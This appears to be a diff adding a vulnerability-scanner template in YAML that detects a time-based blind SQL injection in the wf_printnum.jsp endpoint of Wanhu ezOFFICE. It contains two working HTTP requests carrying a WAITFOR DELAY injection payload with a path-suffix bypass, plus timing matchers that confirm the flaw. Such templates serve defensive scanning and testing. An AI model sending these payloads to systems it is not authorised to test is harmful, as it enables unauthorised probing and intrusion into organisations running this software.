@@ -1,0 +1,37 @@
+id: poc-yaml-wanhu-ezoffice-wf-printnum-jsp-sqli
+info:
+  name: "万户 ezOFFICE wf_printnum.jsp 基于时间的盲注 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 万户OA
+  description: |
+    This template identifies a SQL injection vulnerability in 万户OA ezoffice's wf_printnum.jsp endpoint, which allows time-based blind SQL injection attacks.
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0"
+        condition: and
+        part: body
+        negative: true
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
